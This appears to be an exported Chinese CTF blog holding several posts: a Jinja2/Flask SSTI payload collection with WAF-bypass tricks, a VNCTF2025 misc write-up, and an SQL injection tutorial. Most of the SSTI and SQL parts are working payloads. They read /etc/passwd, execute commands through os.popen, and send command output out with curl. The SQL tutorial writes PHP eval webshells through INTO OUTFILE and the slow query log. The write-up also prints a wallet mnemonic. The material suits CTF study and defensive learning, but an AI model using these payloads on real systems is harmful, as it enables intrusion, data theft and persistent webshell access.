<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903194150593-332610088.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903194150593-332610088.png" alt="img"></a></p>
<p>既然大概知道原理跟利用，我这里不再废话，直接给出大佬们各种绕过payload：</p>
<h4 id="模板语法"><a href="#模板语法" class="headerlink" title="模板语法"></a>模板语法</h4><pre><code class="highlight jinja2">
&#123;% ... %&#125; for Statements #用来声明变量，也可以用于条件语句和循环语句
 
&#123;&#123; ... &#125;&#125; for Expressions to print to the template output #将表达式打印到模板输出
 
&#123;# ... #&#125; for Comments not included in the template output #表示未包含在模板输出中的注释
 
#...# for Line Statements #有和&#123;%%&#125;相同的效果</code></pre>



<h4 id="基础payload"><a href="#基础payload" class="headerlink" title="基础payload"></a><strong>基础payload</strong></h4><pre><code class="highlight jinja2">常用入口：
1) 基类当入口
2)config #获取配置信息
3)lipsum
&#123;&#123; lipsum.__globals__.__builtins__.open(&#x27;/flag&#x27;).read() &#125;&#125;

4)request
&#123;&#123;request.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/etc/passwd&#x27;).read()&#125;&#125;
&#123;&#123;request.application.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/etc/passwd&#x27;).read()&#125;&#125;

5)url_for
&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125;

6)get_flashed 
&#123;&#123;get_flashed_messages.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125;


调用命令:
1)popen
2)__builtins__ 调用方法</code></pre>



<pre><code class="highlight plaintext">获得基类
#python2.7
&#x27;&#x27;.__class__.__mro__[2]
&#123;&#125;.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
request.__class__.__mro__[1]
#python3.7
&#x27;&#x27;.__。。。class__.__mro__[1]
&#123;&#125;.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
request.__class__.__mro__[1]

#python 2.7
#文件操作
#找到file类
[].__class__.__bases__[0].__subclasses__()[40]
#读文件
[].__class__.__bases__[0].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()
#写文件
[].__class__.__bases__[0].__subclasses__()[40](&#x27;/tmp&#x27;).write(&#x27;test&#x27;)

#命令执行
#os执行
[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache下有os类，可以直接执行命令：
[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#x27;id&#x27;).read()
#eval,impoer等全局函数
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__下有eval，__import__等的全局函数，可以利用此来执行命令：
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;id&#x27;).read()
  
#python3.7
#命令执行
&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
#文件操作
&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;filename&#x27;, &#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
#windows下的os命令
&quot;&quot;.__class__.__bases__[0].__subclasses__()[118].__init__.__globals__[&#x27;popen&#x27;](&#x27;dir&#x27;).read()</code></pre>

<p><strong>###</strong> <strong>总结一下其实思路有以下几种</strong></p>
<p>1).通过文件读取的命令来注入，例如**&lt;class ‘_frozen_importlib_external.FileLoader’&gt;**这种</p>
<p>2).利用os方法(拿到一个os开头的class就可以)来执行系统命令，达到cat flag的需求</p>
<ul>
<li><p>一般按基类开跑的是要拿builtins的方法</p>
</li>
<li><p>也可以使用config方法<strong>config.class.init[‘glo’+’bals’][‘os’].popen(‘ls’).read()</strong></p>
</li>
</ul>
<p> <strong>一些绕waf的姿势：</strong></p>
<p><strong>过滤[</strong></p>
<pre><code class="highlight plaintext">#getitem、pop
&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/etc/passwd&#x27;).read()
&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(&#x27;ls&#x27;).read()</code></pre>

<p><strong>过滤引号</strong></p>
<pre><code class="highlight plaintext">#chr函数
&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;
&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read()&#125;&#125;#request对象
&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() &#125;&#125;&amp;path=/etc/passwd
#命令执行
&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;
&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() &#125;&#125;
&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() &#125;&#125;&amp;cmd=id
#request 绕过
&#123;&#123;().__class__.__bases__[0].__subclasses__()[213].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()&#125;&#125;&amp;arg1=open&amp;arg2=/etc/passwd    
\#分析：
request.args 是flask中的一个属性,为返回请求的参数,这里把path当作变量名,将后面的路径传值进来,进而绕过了引号的过滤。
若args被过滤了，还可以使用values来接受GET或者POST参数。：
&#123;&#123;().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.cookies.arg1](request.cookies.arg2).read()&#125;&#125;
Cookie:arg1=open;arg2=/etc/passwd
&#123;&#123;().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.values.arg1](request.values.arg2).read()&#125;&#125;
post:arg1=open&amp;arg2=/etc/passwd</code></pre>

<p><strong>过滤下划线</strong></p>
<pre><code class="highlight plaintext">&#123;&#123;&#x27;&#x27;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#x27;/etc/passwd&#x27;).read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__
//request.args.xx就能直接查询对应的参数值，把原参数换成[request.args.xx]即可</code></pre>

<p><strong>过滤花括号</strong></p>
<pre><code class="highlight plaintext">#用&#123;%%&#125;标记
&#123;% if &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#x27;curl http://127.0.0.1:7999/?i=`whoami`&#x27;).read()==&#x27;p&#x27; %&#125;1&#123;% endif %&#125;</code></pre>

<p><strong>过滤关键字</strong></p>
<ul>
<li>使用切片将逆置的关键字顺序输出，进而达到绕过。</li>
</ul>
<pre><code class="highlight plaintext">&quot;&quot;[&quot;__cla&quot;&quot;ss__&quot;]
&quot;&quot;.__getattribute__(&quot;__cla&quot;&quot;ss__&quot;)</code></pre>

<ul>
<li>反转</li>
</ul>
<pre><code class="highlight plaintext">&quot;&quot;[&quot;__ssalc__&quot;][::-1]
&quot;&quot;.__getattribute__(&quot;__ssalc__&quot;[::-1])</code></pre>

<ul>
<li>利用”+”进行字符串拼接，绕过关键字过滤。</li>
</ul>
<pre><code class="highlight plaintext">&#123;&#123;()[&#x27;__cla&#x27;+&#x27;ss__&#x27;].__bases__[0].__subclasses__()[40].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;ev&#x27;+&#x27;al&#x27;](&quot;__im&quot;+&quot;port__(&#x27;o&#x27;+&#x27;s&#x27;).po&quot;&quot;pen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125;</code></pre>

<ul>
<li>join拼接</li>
</ul>
<p>利用join（）函数绕过关键字过滤</p>
<pre><code class="highlight plaintext">&#123;&#123;[].__class__.__base__.__subclasses__()[40](&quot;fla&quot;.join(&quot;/g&quot;)).read()&#125;&#125;</code></pre>

<ul>
<li>利用引号绕过</li>
</ul>
<pre><code class="highlight plaintext">[&#123;&#123;[].__class__.__base__.__subclasses__()40&quot;/fl&quot;&quot;ag&quot;.read()&#125;&#125;]()</code></pre>

<ul>
<li>使用str原生函数replace替换</li>
</ul>
<p>将额外的字符拼接进原本的关键字里面，然后利用replace函数将其替换为空。</p>
<pre><code class="highlight plaintext">&#123;&#123;().__getattribute__(&#x27;__claAss__&#x27;.replace(&quot;A&quot;,&quot;&quot;)).__bases__[0].__subclasses__()[376].__init__.__globals__[&#x27;popen&#x27;](&#x27;whoami&#x27;).read()&#125;&#125;</code></pre>

<ul>
<li>ascii转换</li>
</ul>
<pre><code class="highlight plaintext">将每一个字符都转换为ascii值后再拼接在一起。

&quot;&#123;0:c&#125;&quot;.format(97)=&#x27;a&#x27;
&quot;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&quot;.format(95,95,99,108,97,115,115,95,95)=&#x27;__class__&#x27;</code></pre>

<ul>
<li>16进制编码绕过</li>
</ul>
<pre><code class="highlight plaintext">&quot;__class__&quot;==&quot;\x5f\x5fclass\x5f\x5f&quot;==&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;

例子：
&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f&#x27;](&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&#125;&#125;
\
同理，也可使用八进制编码绕过</code></pre>

<ul>
<li><p>base64编码绕过</p>
<p>对于python2，可利用base64进行绕过，对于python3没有decode方法，不能使用该方法进行绕过。</p>
</li>
</ul>
<pre><code class="highlight plaintext">&quot;__class__&quot;==(&quot;X19jbGFzc19f&quot;).decode(&quot;base64&quot;)</code></pre>

<p>例子：</p>
<pre><code class="highlight plaintext">&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;X19idWlsdGluc19f&#x27;.decode(&#x27;base64&#x27;)][&#x27;ZXZhbA==&#x27;.decode(&#x27;base64&#x27;)](&#x27;X19pbXBvcnRfXygib3MiKS5wb3BlbigibHMgLyIpLnJlYWQoKQ==&#x27;.decode(&#x27;base64&#x27;))&#125;&#125;  
等价于  
&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;</code></pre>

<ul>
<li>unicode编码绕过</li>
</ul>
<pre><code class="highlight plaintext">&#123;%print((((lipsum|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;))|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;os&quot;))|attr(&quot;\u0070\u006f\u0070\u0065\u006e&quot;)(&quot;\u0074\u0061\u0063\u0020\u002f\u0066\u002a&quot;))|attr(&quot;\u0072\u0065\u0061\u0064&quot;)())%&#125;
等同于lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;tac /f*&#x27;).read()</code></pre>

<ul>
<li>Hex编码绕过</li>
</ul>
<pre><code class="highlight plaintext">[&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&#x27;][&#x27;\x65\x76\x61\x6c&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;]()

&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;\x6f\x73&#x27;].popen(&#x27;\x6c\x73\x20\x2f&#x27;).read()&#125;&#125;   
等价于   
&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;

&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;</code></pre>

<ul>
<li>绕过init<br>可以用<code>__enter__</code>或<code>__exit__</code>替代<code>__init__</code></li>
</ul>
<pre><code class="highlight plaintext">&#123;().__class__.__bases__[0].__subclasses__()[213].__enter__.__globals__[&#x27;__builtins__&#x27;][&#x27;open&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</code></pre>

<pre><code class="highlight plaintext">&#123;&#123;().__class__.__bases__[0].__subclasses__()[213].__exit__.__globals__[&#x27;__builtins__&#x27;][&#x27;open&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</code></pre>

<p><strong>利用示例：</strong></p>
<pre><code class="highlight plaintext">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;
&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;
  &#123;% for b in c.__init__.__globals__.values() %&#125;
  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;
    &#123;% if &#x27;eval&#x27; in b.keys() %&#125;
      &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;) &#125;&#125;         //popen的参数就是要执行的命令
    &#123;% endif %&#125;
  &#123;% endif %&#125;
  &#123;% endfor %&#125;
&#123;% endif %&#125;
&#123;% endfor %&#125;</code></pre>

<p>这里推荐自动化工具tplmap，拿shell、执行命令、bind_shell、反弹shell、上传下载文件，Tplmap为SSTI的利用提供了很大的便利</p>
<p>github地址：<a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a></p>
<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903230151729-80521204.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903230151729-80521204.png" alt="img"></a></p>
<p>一键shell真香，还支持其他模板（Smarty，Mako，Tornado，Jinja2）的注入检测</p>
<h3 id="tornado"><a href="#tornado" class="headerlink" title="tornado"></a>tornado</h3><p>tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过<code>&#123;&#123;&#125;&#125;</code>进行传递变量和执行简单的表达式。</p>
<p>以下代码将定义一个TEMPLATE变量作为一个模板文件，然后使用传入的name替换模板中的”FOO”，在进行加载模板并输出，且未对name值进行安全检查输入情况。</p>
]]></content>
      <tags>
        <tag>-CTF -Web</tag>
      </tags>
  </entry>
  <entry>
    <title>VNCTF2025</title>
    <url>/2025/02/10/VNCTF2025/</url>
    <content><![CDATA[<h1 id="VNCTF-2025"><a href="#VNCTF-2025" class="headerlink" title="VNCTF 2025"></a>VNCTF 2025</h1><p>入坑CTF以来打过最难的个人赛，打完的表情就像先辈的一张表情包一样</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/e7584e8da9773912fec999bbbd198618347ae2dc.jpg" alt="img"></p>
<p>比赛期间就出了一题，这才是正统misc吗哈哈(</p>
<h2 id="VN-Lang"><a href="#VN-Lang" class="headerlink" title="VN_Lang"></a><strong>VN_Lang</strong></h2><p>不能较真的签到题，附件一个exe,一个莫名其妙的源代码。看起来花里胡哨，实际010一查就出来了</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210180505746.png" alt="image-20250210180505746"></p>
<h2 id="echo-flowers"><a href="#echo-flowers" class="headerlink" title="echo_flowers"></a>echo_flowers</h2><p>区块链的基本知识和取证搭配的好题。大概?</p>
<p>给了一个安卓的镜像，先VM开了，不得不吐槽的一点是，操作是真吃力啊。。。</p>
<p>先放个hint<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210180853422.png" alt="image-20250210180853422"></p>
<p>我没有那么多知识储备，所以其实能用的hint也不多，就一个软件本身没有缓存<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210180951701.png" alt="image-20250210180951701"></p>
<p>看到干干净净的桌面其实就能感觉到不对劲了哈哈，连文件管理都没有还整什么，果断放弃仿真取证。挂DiskGenius</p>
<p>既然说软件本身没有任何缓存。。那么从哪里入手呢，其实和bashhistory有点相似吧(刚好之前看到过类似的题目)</p>
<p>也就是，从输入法的缓存，或者说，输入的记录入手。</p>
<p>定位交给AI<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210181822981.png" alt="image-20250210181822981"></p>
<p>正好我们是可以找到files这一文件夹的<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210181930421.png" alt="image-20250210181930421"></p>
<p>接下来一个个看过去其实也可以，最终是可以定位到sgim_gd_usr.bin这个文件的,当然按理来说我们应该先排查.db，.dat，.log这类文件的<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210182036252.png" alt="image-20250210182036252"></p>
<p>最终找到助记词ranch only space define laundry carpet muscle ramp high twenty couch fashion</p>
<p>挂上Metamask,记得一定要用没用使用过metamask的浏览器，因为如果你有账户你要导入一般是会让你直接输入密钥登录的</p>
<p>接下来按照指示输入助记词，重置密码，点击你的账户-&gt;账户详情-&gt;查看密钥就结束了</p>
<h2 id="ezSignal"><a href="#ezSignal" class="headerlink" title="ezSignal"></a>ezSignal</h2><p>C3师傅的旷世之作(不仅指半夜更新附件)</p>
<p>当然其实C3师傅给的hint已经相当多了，或者说，都已经把解题步骤告诉你了哈哈(</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210183042001.png" alt="image-20250210183042001"></p>
<p>直接解压会碰到这个问题，那么有人就要问了为什么呢</p>
<p>查下或者根据提示可以发现包里是有一个名字为空格的文件的，而在Windows系统中这种文件是不会被显示的.当然在不知道这点的前提下，可以观察一下压缩包的结构</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210183450579.png" alt="image-20250210183450579"></p>
<p>可以明显看到frFileNameLength是1，并且文件名显示的是’ ‘</p>
<p>那么将压缩包复制到Ubuntu</p>
<pre><code class="highlight bash">unzip ezSignal_fix.zip
<span class="built_in">mv</span> <span class="string">&#x27; &#x27;</span> 2</code></pre>

<p>再复制回来，010查一下2,<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210183802628.png" alt="image-20250210183802628"></p>
<p>问一下AI，知道是一个grc文件，搭配<a href="https://wiki.gnuradio.org/index.php/InstallingGR">GNU</a>使用，改后缀为grc</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210184040460.png" alt="image-20250210184040460"></p>
<p>喂AI&#x2F;看hint,这是一个窄带调谐+将复数信号转换为虚部实部分别输出的过程，而我们的任务是逆向一下它，写个Python脚本。(赛后C3说可以Cyber chef，可以Linux。。诶我怎么和我的电脑一个温度了)</p>
<p>喂了半天ChatGPT报错报了一下午＋一晚上，活全家了哈哈()</p>
<p>抱着试一试的心情给Deepseek跑了一下，两遍过，最支持国产的一集。。。</p>
<pre><code class="highlight plaintext">import numpy as np
from scipy.io import wavfile
from scipy.signal import butter, lfilter

def read_gr_file(filename, dtype=np.float32, endian=&quot;&lt;&quot;):
    &quot;&quot;&quot;
    读取 GRC 生成的二进制文件（如 blocks_file_sink 的输出）
    - dtype: 数据类型（默认 float32）
    - endian: 字节序（默认小端序 &quot;&lt;&quot;，大端序用 &quot;&gt;&quot;）
    &quot;&quot;&quot;
    # 以二进制模式读取文件
    with open(filename, &quot;rb&quot;) as f:
        raw_bytes = f.read()
    

# 转换为指定字节序和类型的 numpy 数组

dt = np.dtype(f&quot;&#123;endian&#125;&#123;dtype().dtype.char&#125;&quot;)
data = np.frombuffer(raw_bytes, dtype=dt)
return data

def main():

    # 参数配置（与 GRC 一致）

     samp_rate = 48000      # 音频采样率
     if_rate = 192000       # 中频速率（usrp_rate/3 = 576000/3）
     max_dev = 5e3          # FM最大频偏
     endian = &quot;&lt;&quot;           # 字节序（GRC 默认小端序）

try:

    # 1. 读取I/Q数据（二进制模式）

     i_data = read_gr_file(&quot;flag1.txt&quot;, dtype=np.float32, endian=endian)
     q_data = read_gr_file(&quot;flag2.txt&quot;, dtype=np.float32, endian=endian)

    # 检查长度一致性

     if len(i_data) != len(q_data):
         raise ValueError(&quot;I/Q数据长度不一致！&quot;)

    # 2. 合并为复数信号（I + jQ）

     complex_signal = i_data + 1j * q_data

    # 3. FM解调（相位差分法）

     phase = np.unwrap(np.angle(complex_signal))
     demodulated = np.diff(phase) / (2 * np.pi * max_dev) * if_rate
     demodulated = demodulated.astype(np.float32)

    # 4. 重采样到音频采样率（48 kHz）

     demodulated_resampled = demodulated[::4]  # 简单下采样

    # 5. 低通滤波（300-5000 Hz，与GRC一致）

     b, a = butter(4, 5000, fs=samp_rate, btype=&#x27;low&#x27;)
     demodulated_resampled = lfilter(b, a, demodulated_resampled)

    # 6. 归一化并保存为WAV

     demodulated_resampled /= np.max(np.abs(demodulated_resampled)) * 1.2
     wavfile.write(&quot;flag_recovered.wav&quot;, samp_rate, demodulated_resampled)

     print(&quot;还原成功！保存为 flag_recovered.wav&quot;)

except FileNotFoundError:
    print(&quot;错误：未找到 flag1.txt 或 flag2.txt！&quot;)
except Exception as e:
    print(f&quot;错误：&#123;str(e)&#125;&quot;)

if __name__ == &quot;__main__&quot;:
    main()</code></pre>

<p>得到一个92.7MB的wav，那其实一想就是SSTV了，用RX-SSTV跑一下</p>
<p>得到一张阿兹特克码，扫一下得到flag<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/2025-02-09_09.53.19.jpg" alt="2025-02-09_09.53.19"></p>
<p>唉，不能老实做传统misc了,不去折腾研究一些东西感觉永远都只能是入门仔了。也算是吃一堑长一智吧。</p>
]]></content>
      <tags>
        <tag>-CTF -Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>从零开始的SQL注入生活</title>
    <url>/2025/03/09/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E7%94%9F%E6%B4%BB/</url>
    <content><![CDATA[<h1 id="从零开始的SQL注入生活"><a href="#从零开始的SQL注入生活" class="headerlink" title="从零开始的SQL注入生活"></a>从零开始的SQL注入生活</h1><p>字义上的从零开始喵。。字义上的私了好多次喵。。。</p>
<h2 id="Episode-1-SQL数据库基础操作"><a href="#Episode-1-SQL数据库基础操作" class="headerlink" title="Episode 1   SQL数据库基础操作"></a>Episode 1   SQL数据库基础操作</h2><ul>
<li><strong>创建</strong></li>
</ul>
<pre><code class="highlight sql"><span class="keyword">create</span> database_name;#建立一个数据库
<span class="keyword">create</span> <span class="keyword">table</span> table_name(
column1 datatype,
.......
);#建立一个表
</code></pre>



<ul>
<li><strong>查询</strong></li>
</ul>
<pre><code class="highlight sql"><span class="keyword">show</span> tables; <span class="operator">/</span><span class="operator">/</span>显示当前选中的数据库中的所有表名
<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users limit <span class="number">1</span>; <span class="operator">/</span><span class="operator">/</span>获取第一行的数据，可以通过这个方法得到表中所有的字段名，不会被大量数据顶走
<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> [表名]; #查询整表
<span class="keyword">select</span> [列名<span class="number">1</span>, 列名<span class="number">2</span>,...] <span class="keyword">from</span> [库名.表名]; #指定列查询
<span class="keyword">select</span> [表达式<span class="number">1</span>, 表达式<span class="number">2</span>,...] <span class="keyword">from</span> [库名.表名]; #查询表达式字段
group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata
<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27; &#x27;</span>
<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27; &#x27;</span>
<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> [表名] <span class="keyword">order</span> <span class="keyword">by</span> [排序字段] #排序
#条件查询<span class="keyword">Where</span>
(<span class="number">1</span>)比较运算符 (<span class="number">2</span>)<span class="keyword">BETWEEN</span> ... <span class="keyword">AND</span> ... (<span class="number">3</span>)<span class="keyword">IN</span> (<span class="number">4</span>)<span class="keyword">IS</span> <span class="keyword">NULL</span> (<span class="number">5</span>)<span class="keyword">LIKE</span> (<span class="number">6</span>)<span class="keyword">AND</span> (<span class="number">7</span>)<span class="keyword">OR</span> 
(<span class="number">8</span>)<span class="keyword">NOT</span>
<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> [表名] <span class="keyword">where</span> [条件];</code></pre>

<ul>
<li><strong>插入</strong></li>
</ul>
<pre><code class="highlight sql"><span class="keyword">insert</span> <span class="keyword">into</span> table_names (column1,column2,column3...)
<span class="keyword">insert</span> <span class="keyword">into</span> (table1,table2,table3) <span class="keyword">values</span> (value1,value2,value3) #替换键已存在的值
<span class="keyword">on</span> duplicate key <span class="keyword">update</span> ()#不会了，留个坑先(</code></pre>

<ul>
<li><strong>注马</strong></li>
</ul>
<pre><code class="highlight sql"><span class="keyword">select</span> &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]); ?&gt;&quot; <span class="keyword">into</span> outfile&quot;D:\\phpstudy_pro\\WWW\\shell.php&quot;
<span class="number">2.</span>利用日志文件写入木马
<span class="number">1.</span>开启日志功能

<span class="keyword">set</span> <span class="keyword">global</span> slow_query_log<span class="operator">=</span><span class="number">1</span>;
<span class="number">2.</span>设置日志存储路径

<span class="keyword">SET</span> <span class="keyword">GLOBAL</span> slow_query_log_file<span class="operator">=</span><span class="string">&#x27;D:\\phpstudy_pro\\WWW\\shell.php&#x27;</span>;
<span class="number">3.</span>执行<span class="keyword">sql</span>语句

<span class="keyword">select</span> <span class="string">&#x27;&lt;?php eval($_GET[H])?&gt;&#x27;</span> <span class="keyword">or</span> SLEEP(<span class="number">11</span>);
</code></pre>



<h2 id="episode-2-基础注入"><a href="#episode-2-基础注入" class="headerlink" title="episode 2  基础注入"></a>episode 2  基础注入</h2><h3 id="union注入-1’"><a href="#union注入-1’" class="headerlink" title="union注入(-1’)"></a>union注入(-1’)</h3><p>union注入原本是用于合并多条select查询结果；通过-1造成前面一条查询语句返回为空，从而显示我们注入的查询语句。(因为网页只能够显示一条查询记录)</p>
<pre><code class="highlight sql">#<span class="number">1.</span>查表列数
<span class="number">-1</span>’<span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span><span class="operator">~</span><span class="number">4</span>;
#查完后使用<span class="keyword">select</span> 语句
<span class="keyword">select</span> <span class="number">1</span>，<span class="number">2</span>，<span class="number">3</span>；
#查库名
<span class="number">-1</span>’<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>，database()；
#查表名
<span class="number">-1</span>’<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>’security’),<span class="number">3</span>#
#查列名
<span class="number">-1</span>’<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(column_name)<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>’security’ <span class="keyword">and</span> table_name<span class="operator">=</span>’emails’),<span class="number">3</span>#
#直接查数据
<span class="number">-1</span>’<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> email_id <span class="keyword">from</span> emails limit <span class="number">2</span>,<span class="number">1</span>),<span class="number">3</span>#

#其实还是更推荐urlcode一下注释符号防止没有回弹(<span class="operator">%</span><span class="number">23</span>)</code></pre>

<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>1.extractvalue函数</p>
<p>查询对象xml某一个标签的值</p>
<p>如果查询的标签格式不对，就会报错</p>
<p>利用concat函数来链接两个字符串</p>
<p>查询数据库：’ and extractvalue(‘div’,concat(‘~’,database()))#</p>
<pre><code class="highlight sql"><span class="number">-1</span><span class="string">&#x27; and(select extractive(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,database())))#</span></code></pre>

<p>-&gt;查询div，~存在会报错</p>
<p>爆出~database（）</p>
<p>2.updatexml</p>
<p>更新xml文档内容</p>
